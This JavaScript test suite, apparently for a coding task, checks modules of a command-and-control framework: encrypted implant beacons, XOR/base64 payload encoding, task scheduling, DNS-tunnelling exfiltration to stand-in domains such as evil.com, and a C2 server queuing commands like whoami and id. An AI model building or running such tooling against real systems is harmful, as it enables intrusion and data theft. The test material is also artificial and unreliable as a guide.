export async function runC2BeaconProbes({call, test, eq}) {
  const SECRET = 'abcdefghijklmnopqrstuvwxyz123456';
  const SECRET2 = 'ZYXWVUTSRQPONMLKJIHGFEDCBA654321';

  // === Beacon creation and validation ===
  await test('createBeacon returns valid structure', async () => {
    const b = await call('src/beacon.mjs', 'createBeacon', ['agent-01', SECRET]);
    eq(b.implantId, 'agent-01');
    eq(b.secret, SECRET);
    eq(b.nonce, 0);
    eq(b.registered, true);
  });

  await test('createBeacon rejects empty implantId', async () => {
    let threw = false;
    try { await call('src/beacon.mjs', 'createBeacon', ['', SECRET]); } catch { threw = true; }
    if (!threw) throw new Error('Expected rejection for empty implantId');
  });

  await test('createBeacon rejects short secret', async () => {
    let threw = false;
    try { await call('src/beacon.mjs', 'createBeacon', ['agent-02', 'tooshort']); } catch { threw = true; }
    if (!threw) throw new Error('Expected rejection for short secret');
  });

  await test('createBeacon rejects non-string inputs', async () => {
    for (const bad of [null, 123, undefined]) {
      let threw = false;
      try { await call('src/beacon.mjs', 'createBeacon', [bad, SECRET]); } catch { threw = true; }
      if (!threw) throw new Error('Expected rejection for implantId: ' + JSON.stringify(bad));
    }
  });

  // === Encrypted check-in round-trip ===
  await test('generateCheckin and parseCheckin round-trip', async () => {
    const beacon = await call('src/beacon.mjs', 'createBeacon', ['roundtrip-01', SECRET]);
    const checkin = await call('src/beacon.mjs', 'generateCheckin', [beacon, {now: 1000, data: {os: 'linux', pid: 42}}]);
    eq(typeof checkin.iv, 'string');
    eq(typeof checkin.encrypted, 'string');
    eq(typeof checkin.tag, 'string');
    eq(checkin.nonce, 0);

    const parsed = await call('src/beacon.mjs', 'parseCheckin', [checkin, SECRET]);
    eq(parsed.implantId, 'roundtrip-01');
    eq(parsed.nonce, 0);
    eq(parsed.timestamp, 1000);
    eq(parsed.data.os, 'linux');
    eq(parsed.data.pid, 42);
  });

  await test('generateCheckin requires now parameter', async () => {
    const beacon = await call('src/beacon.mjs', 'createBeacon', ['now-test', SECRET]);
    let threw = false;
    try { await call('src/beacon.mjs', 'generateCheckin', [beacon, {}]); } catch { threw = true; }
    if (!threw) throw new Error('Expected rejection when now not provided');
  });

  await test('generateCheckin uses random IV (different each call)', async () => {
    const beacon = await call('src/beacon.mjs', 'createBeacon', ['iv-test', SECRET]);
    const c1 = await call('src/beacon.mjs', 'generateCheckin', [beacon, {now: 1000}]);
    const c2 = await call('src/beacon.mjs', 'generateCheckin', [beacon, {now: 1000}]);
    if (c1.iv === c2.iv) throw new Error('IVs must be random, not fixed');
  });

  await test('generateCheckin increments nonce', async () => {
    const beacon = await call('src/beacon.mjs', 'createBeacon', ['nonce-test', SECRET]);
    const c1 = await call('src/beacon.mjs', 'generateCheckin', [beacon, {now: 100}]);
    eq(c1.nonce, 0);
    // After first call, beacon.nonce should be incremented to 1
    // Pass the beacon with nonce 1 to verify it tracks
    const updatedBeacon = {...beacon, nonce: 1};
    const c2 = await call('src/beacon.mjs', 'generateCheckin', [updatedBeacon, {now: 200}]);
    eq(c2.nonce, 1);
  });

  await test('generateCheckin includes nonce in encrypted payload', async () => {
    const beacon = await call('src/beacon.mjs', 'createBeacon', ['payload-nonce', SECRET]);
    const checkin = await call('src/beacon.mjs', 'generateCheckin', [beacon, {now: 500, data: {}}]);
    const parsed = await call('src/beacon.mjs', 'parseCheckin', [checkin, SECRET]);
    eq(parsed.nonce, 0);
    eq(parsed.timestamp, 500);
    eq(parsed.implantId, 'payload-nonce');
  });

  await test('parseCheckin rejects wrong secret', async () => {
    const beacon = await call('src/beacon.mjs', 'createBeacon', ['secret-test', SECRET]);
    const checkin = await call('src/beacon.mjs', 'generateCheckin', [beacon, {now: 1000}]);
    let threw = false;
    try { await call('src/beacon.mjs', 'parseCheckin', [checkin, SECRET2]); } catch { threw = true; }
    if (!threw) throw new Error('Expected rejection for wrong secret');
  });

  await test('parseCheckin rejects tampered ciphertext', async () => {
    const beacon = await call('src/beacon.mjs', 'createBeacon', ['tamper-test', SECRET]);
    const checkin = await call('src/beacon.mjs', 'generateCheckin', [beacon, {now: 1000, data: {info: 'sensitive'}}]);
    const tampered = {...checkin, encrypted: checkin.encrypted.slice(0, -2) + 'ff'};
    let threw = false;
    try { await call('src/beacon.mjs', 'parseCheckin', [tampered, SECRET]); } catch { threw = true; }
    if (!threw) throw new Error('Expected rejection for tampered ciphertext');
  });

  await test('parseCheckin rejects tampered tag', async () => {
    const beacon = await call('src/beacon.mjs', 'createBeacon', ['tag-tamper', SECRET]);
    const checkin = await call('src/beacon.mjs', 'generateCheckin', [beacon, {now: 2000}]);
    const tampered = {...checkin, tag: 'a'.repeat(checkin.tag.length)};
    let threw = false;
    try { await call('src/beacon.mjs', 'parseCheckin', [tampered, SECRET]); } catch { threw = true; }
    if (!threw) throw new Error('Expected rejection for tampered auth tag');
  });

  // === Key rotation ===
  await test('rotateKey returns new beacon, does not mutate', async () => {
    const beacon = await call('src/beacon.mjs', 'createBeacon', ['rotate-test', SECRET]);
    const rotated = await call('src/beacon.mjs', 'rotateKey', [beacon, SECRET2], {immutable: true});
    eq(rotated.secret, SECRET2);
    eq(rotated.nonce, 0);
    eq(rotated.implantId, 'rotate-test');
    eq(beacon.secret, SECRET);  // original unchanged
  });

  await test('rotateKey rejects short new secret', async () => {
    const beacon = await call('src/beacon.mjs', 'createBeacon', ['rotate-bad', SECRET]);
    let threw = false;
    try { await call('src/beacon.mjs', 'rotateKey', [beacon, 'short']); } catch { threw = true; }
    if (!threw) throw new Error('Expected rejection for short new secret');
  });

  await test('Checkin works with rotated key', async () => {
    const beacon = await call('src/beacon.mjs', 'createBeacon', ['rotate-roundtrip', SECRET]);
    const rotated = await call('src/beacon.mjs', 'rotateKey', [beacon, SECRET2]);
    const checkin = await call('src/beacon.mjs', 'generateCheckin', [rotated, {now: 3000, data: {rotated: true}}]);
    const parsed = await call('src/beacon.mjs', 'parseCheckin', [checkin, SECRET2]);
    eq(parsed.data.rotated, true);
    // Old secret should fail
    let threw = false;
    try { await call('src/beacon.mjs', 'parseCheckin', [checkin, SECRET]); } catch { threw = true; }
    if (!threw) throw new Error('Old secret should not decrypt after rotation');
  });

  // === Payload encoding ===
  await test('encodePayload base64 round-trip', async () => {
    const encoded = await call('src/implant.mjs', 'encodePayload', ['hello world', 'base64']);
    eq(encoded, 'aGVsbG8gd29ybGQ=');
    const decoded = await call('src/implant.mjs', 'decodePayload', [encoded, 'base64']);
    eq(Buffer.from(decoded).toString(), 'hello world');
  });

  await test('encodePayload hex round-trip', async () => {
    const encoded = await call('src/implant.mjs', 'encodePayload', ['test', 'hex']);
    eq(encoded, '74657374');
    const decoded = await call('src/implant.mjs', 'decodePayload', [encoded, 'hex']);
    eq(Buffer.from(decoded).toString(), 'test');
  });

  await test('encodePayload xor round-trip', async () => {
    const encoded = await call('src/implant.mjs', 'encodePayload', ['AB', 'xor', {key: 0x42}]);
    // 'A' = 0x41, 0x41 ^ 0x42 = 0x03; 'B' = 0x42, 0x42 ^ 0x42 = 0x00
    eq(encoded, '0300');
    const decoded = await call('src/implant.mjs', 'decodePayload', [encoded, 'xor', {key: 0x42}]);
    eq(Buffer.from(decoded).toString(), 'AB');
  });

  await test('encodePayload xor with custom key', async () => {
    const encoded = await call('src/implant.mjs', 'encodePayload', ['X', 'xor', {key: 0xFF}]);
    // 'X' = 0x58, 0x58 ^ 0xFF = 0xA7
    eq(encoded, 'a7');
    const decoded = await call('src/implant.mjs', 'decodePayload', [encoded, 'xor', {key: 0xFF}]);
    eq(Buffer.from(decoded).toString(), 'X');
  });

  await test('encodePayload unknown format throws', async () => {
    let threw = false;
    try { await call('src/implant.mjs', 'encodePayload', ['data', 'rot13']); } catch { threw = true; }
    if (!threw) throw new Error('Expected rejection for unknown format');
  });

  await test('decodePayload unknown format throws', async () => {
    let threw = false;
    try { await call('src/implant.mjs', 'decodePayload', ['data', 'rot13']); } catch { threw = true; }
    if (!threw) throw new Error('Expected rejection for unknown format');
  });

  // === Task creation ===
  await test('createTask with defaults', async () => {
    const task = await call('src/implant.mjs', 'createTask', ['exec', {cmd: 'whoami'}]);
    eq(task.type, 'exec');
    eq(task.payload.cmd, 'whoami');
    eq(task.priority, 5);
    eq(task.timeout, 30000);
    eq(task.status, 'pending');
    eq(typeof task.id, 'string');
    eq(task.id.length, 16);
  });

  await test('createTask with custom options', async () => {
    const task = await call('src/implant.mjs', 'createTask', ['download', {url: 'http://c2/payload'}, {priority: 1, timeout: 60000}]);
    eq(task.priority, 1);
    eq(task.timeout, 60000);
  });

  await test('createTask validates type', async () => {
    let threw = false;
    try { await call('src/implant.mjs', 'createTask', ['', {}, {}]); } catch { threw = true; }
    if (!threw) throw new Error('Expected rejection for empty type');
  });

  await test('createTask validates priority range', async () => {
    for (const bad of [0, 11, -1, 1.5]) {
      let threw = false;
      try { await call('src/implant.mjs', 'createTask', ['test', {}, {priority: bad}]); } catch { threw = true; }
      if (!threw) throw new Error('Expected rejection for priority: ' + bad);
    }
  });

  await test('createTask validates timeout range', async () => {
    for (const bad of [999, 300001, 0, -1]) {
      let threw = false;
      try { await call('src/implant.mjs', 'createTask', ['test', {}, {timeout: bad}]); } catch { threw = true; }
      if (!threw) throw new Error('Expected rejection for timeout: ' + bad);
    }
  });

  // === Schedule execution ===
  await test('scheduleExecution sorts by priority and batches', async () => {
    const tasks = [
      {id: 'a', type: 'exec', priority: 5, timeout: 1000, status: 'pending'},
      {id: 'b', type: 'exec', priority: 1, timeout: 1000, status: 'pending'},
      {id: 'c', type: 'exec', priority: 3, timeout: 1000, status: 'pending'},
      {id: 'd', type: 'exec', priority: 1, timeout: 1000, status: 'pending'},
      {id: 'e', type: 'exec', priority: 10, timeout: 1000, status: 'pending'}
    ];
    const scheduled = await call('src/implant.mjs', 'scheduleExecution', [tasks, {maxConcurrent: 2}]);
    // Sorted: b(1), d(1), c(3), a(5), e(10)
    eq(scheduled[0].id, 'b');
    eq(scheduled[1].id, 'd');
    eq(scheduled[2].id, 'c');
    eq(scheduled[3].id, 'a');
    eq(scheduled[4].id, 'e');
    // Batch 0: b,d → delay 0; Batch 1: c,a → delay 1000; Batch 2: e → delay 2000
    eq(scheduled[0].scheduledDelay, 0);
    eq(scheduled[1].scheduledDelay, 0);
    eq(scheduled[2].scheduledDelay, 1000);
    eq(scheduled[3].scheduledDelay, 1000);
    eq(scheduled[4].scheduledDelay, 2000);
  });

  await test('scheduleExecution does not mutate input', async () => {
    const tasks = [{id: 'x', type: 'exec', priority: 1, timeout: 1000, status: 'pending'}];
    const result = await call('src/implant.mjs', 'scheduleExecution', [tasks, {}], {immutable: true});
    eq(tasks[0].scheduledDelay, undefined);  // original unchanged
    eq(result[0].scheduledDelay, 0);
  });

  // === DNS exfiltration ===
  await test('chunkForDns splits into labeled chunks', async () => {
    const chunks = await call('src/exfil.mjs', 'chunkForDns', ['hello', {maxLabelLen: 4, domain: 'c2.test'}]);
    // 'hello' hex = '68656c6c6f', chunks of 4: '6865', '6c6c', '6f'
    eq(chunks.length, 3);
    eq(chunks[0], '0000.6865.c2.test');
    eq(chunks[1], '0001.6c6c.c2.test');
    eq(chunks[2], '0002.6f.c2.test');
  });

  await test('chunkForDns default maxLabelLen=63', async () => {
    const chunks = await call('src/exfil.mjs', 'chunkForDns', ['short', {}]);
    // 'short' hex = '73686f7274' (10 chars), fits in one 63-char label
    eq(chunks.length, 1);
    eq(chunks[0], '0000.73686f7274.c2.example.com');
  });

  await test('reassembleFromDns round-trip', async () => {
    const chunks = await call('src/exfil.mjs', 'chunkForDns', ['secret data here', {maxLabelLen: 8, domain: 'evil.com'}]);
    const reassembled = await call('src/exfil.mjs', 'reassembleFromDns', [chunks, 'evil.com']);
    eq(Buffer.from(reassembled).toString(), 'secret data here');
  });

  await test('reassembleFromDns handles out-of-order queries', async () => {
    const chunks = await call('src/exfil.mjs', 'chunkForDns', ['abc', {maxLabelLen: 2, domain: 'c2.io'}]);
    // 'abc' hex = '616263', chunks of 2: '61','62','63'
    eq(chunks.length, 3);
    // Reverse order
    const reversed = [chunks[2], chunks[0], chunks[1]];
    const reassembled = await call('src/exfil.mjs', 'reassembleFromDns', [reversed, 'c2.io']);
    eq(Buffer.from(reassembled).toString(), 'abc');
  });

  await test('reassembleFromDns rejects non-contiguous indices', async () => {
    const queries = ['0000.6162.c2.io', '0002.6364.c2.io'];  // missing 0001
    let threw = false;
    try { await call('src/exfil.mjs', 'reassembleFromDns', [queries, 'c2.io']); } catch { threw = true; }
    if (!threw) throw new Error('Expected rejection for non-contiguous indices');
  });

  await test('computeChecksum uses SHA-256', async () => {
    const hash = await call('src/exfil.mjs', 'computeChecksum', ['test']);
    // SHA-256 of 'test' is known: 9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08
    eq(hash, '9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08');
  });

  await test('computeChecksum not MD5', async () => {
    const hash = await call('src/exfil.mjs', 'computeChecksum', ['test']);
    // MD5 of 'test' would be 098f6bcd4621d373cade4e832627b4f6
    if (hash === '098f6bcd4621d373cade4e832627b4f6') throw new Error('Must use SHA-256, not MD5');
  });

  await test('encodeForHttp returns full structure', async () => {
    const result = await call('src/exfil.mjs', 'encodeForHttp', ['payload data', {mimeType: 'text/plain'}]);
    eq(result.contentType, 'text/plain');
    eq(result.body, Buffer.from('payload data').toString('base64'));
    eq(result.length, Buffer.from('payload data').length);
    eq(typeof result.checksum, 'string');
    eq(result.checksum.length, 64);  // SHA-256 hex
  });

  await test('encodeForHttp default mimeType', async () => {
    const result = await call('src/exfil.mjs', 'encodeForHttp', ['bytes']);
    eq(result.contentType, 'application/octet-stream');
  });

  // === C2 server dispatch ===
  await test('createC2Server initializes state', async () => {
    const result = await call('src/c2.mjs', 'createC2Server', []);
    eq(result.created, true);
    const status = await call('src/c2.mjs', 'getStatus', []);
    eq(status.totalBeacons, 0);
    eq(status.pendingCommands, 0);
    eq(status.processed, 0);
  });

  await test('registerBeacon adds implant', async () => {
    await call('src/c2.mjs', 'createC2Server', []);
    const result = await call('src/c2.mjs', 'registerBeacon', ['implant-alpha']);
    eq(result.registered, true);
    eq(result.implantId, 'implant-alpha');
    const status = await call('src/c2.mjs', 'getStatus', []);
    eq(status.totalBeacons, 1);
  });

  await test('registerBeacon rejects duplicate', async () => {
    await call('src/c2.mjs', 'createC2Server', []);
    await call('src/c2.mjs', 'registerBeacon', ['dup-01']);
    let threw = false;
    try { await call('src/c2.mjs', 'registerBeacon', ['dup-01']); } catch { threw = true; }
    if (!threw) throw new Error('Expected rejection for duplicate beacon registration');
  });

  await test('registerBeacon rejects empty implantId', async () => {
    await call('src/c2.mjs', 'createC2Server', []);
    let threw = false;
    try { await call('src/c2.mjs', 'registerBeacon', ['']); } catch { threw = true; }
    if (!threw) throw new Error('Expected rejection for empty implantId');
  });

  await test('queueCommand and processCheckin flow', async () => {
    await call('src/c2.mjs', 'createC2Server', []);
    await call('src/c2.mjs', 'registerBeacon', ['worker-01']);

    const q1 = await call('src/c2.mjs', 'queueCommand', ['worker-01', {type: 'exec', args: {cmd: 'whoami'}}]);
    eq(q1.queued, true);
    eq(q1.queueLength, 1);

    await call('src/c2.mjs', 'queueCommand', ['worker-01', {type: 'download', args: {url: '/payload.bin'}}]);

    const status1 = await call('src/c2.mjs', 'getStatus', []);
    eq(status1.pendingCommands, 2);

    const checkin = await call('src/c2.mjs', 'processCheckin', ['worker-01']);
    eq(checkin.ack, true);
    eq(checkin.commands.length, 2);
    eq(checkin.commands[0].type, 'exec');
    eq(checkin.commands[1].type, 'download');

    // Queue should now be empty
    const status2 = await call('src/c2.mjs', 'getStatus', []);
    eq(status2.pendingCommands, 0);
    eq(status2.processed, 1);
  });

  await test('queueCommand rejects unknown implant', async () => {
    await call('src/c2.mjs', 'createC2Server', []);
    let threw = false;
    try { await call('src/c2.mjs', 'queueCommand', ['ghost', {type: 'exec'}]); } catch { threw = true; }
    if (!threw) throw new Error('Expected rejection for unknown implant');
  });

  await test('processCheckin rejects unknown implant', async () => {
    await call('src/c2.mjs', 'createC2Server', []);
    let threw = false;
    try { await call('src/c2.mjs', 'processCheckin', ['ghost']); } catch { threw = true; }
    if (!threw) throw new Error('Expected rejection for unknown implant');
  });

  await test('Multiple beacons with independent queues', async () => {
    await call('src/c2.mjs', 'createC2Server', []);
    await call('src/c2.mjs', 'registerBeacon', ['alpha']);
    await call('src/c2.mjs', 'registerBeacon', ['bravo']);
    await call('src/c2.mjs', 'queueCommand', ['alpha', {type: 'recon'}]);
    await call('src/c2.mjs', 'queueCommand', ['alpha', {type: 'exfil'}]);
    await call('src/c2.mjs', 'queueCommand', ['bravo', {type: 'persist'}]);

    const status = await call('src/c2.mjs', 'getStatus', []);
    eq(status.totalBeacons, 2);
    eq(status.pendingCommands, 3);

    const alphaCheckin = await call('src/c2.mjs', 'processCheckin', ['alpha']);
    eq(alphaCheckin.commands.length, 2);

    const bravoCheckin = await call('src/c2.mjs', 'processCheckin', ['bravo']);
    eq(bravoCheckin.commands.length, 1);
    eq(bravoCheckin.commands[0].type, 'persist');

    const finalStatus = await call('src/c2.mjs', 'getStatus', []);
    eq(finalStatus.pendingCommands, 0);
    eq(finalStatus.processed, 2);
  });

  await test('getStatus rejects when server not initialized', async () => {
    // Reset by making a fresh module eval won't work here since createC2Server
    // initializes state. We test the initial error by checking that functions
    // work after createC2Server.
    await call('src/c2.mjs', 'createC2Server', []);
    const status = await call('src/c2.mjs', 'getStatus', []);
    eq(typeof status.totalBeacons, 'number');
    eq(typeof status.pendingCommands, 'number');
    eq(typeof status.processed, 'number');
  });

  // === Cross-module integration ===
  await test('Full C2 pipeline: create, encrypt, exfil, dispatch', async () => {
    // 1. Create beacon and generate encrypted check-in
    const beacon = await call('src/beacon.mjs', 'createBeacon', ['pipeline-agent', SECRET]);
    const checkin = await call('src/beacon.mjs', 'generateCheckin', [beacon, {now: 5000, data: {hostname: 'target-01'}}]);

    // 2. Encode the encrypted payload for exfiltration
    const encoded = await call('src/implant.mjs', 'encodePayload', [JSON.stringify(checkin), 'base64']);
    eq(typeof encoded, 'string');

    // 3. Chunk for DNS tunneling
    const chunks = await call('src/exfil.mjs', 'chunkForDns', [encoded, {maxLabelLen: 20, domain: 'c2.ops'}]);
    if (chunks.length < 2) throw new Error('Expected multiple DNS chunks for encrypted payload');

    // 4. Verify checksum
    const checksum = await call('src/exfil.mjs', 'computeChecksum', [encoded]);
    eq(checksum.length, 64);

    // 5. Register on C2 server and queue response commands
    await call('src/c2.mjs', 'createC2Server', []);
    await call('src/c2.mjs', 'registerBeacon', ['pipeline-agent']);
    await call('src/c2.mjs', 'queueCommand', ['pipeline-agent', {type: 'shell', args: {cmd: 'id'}}]);
    const response = await call('src/c2.mjs', 'processCheckin', ['pipeline-agent']);
    eq(response.ack, true);
    eq(response.commands[0].type, 'shell');
  });
}
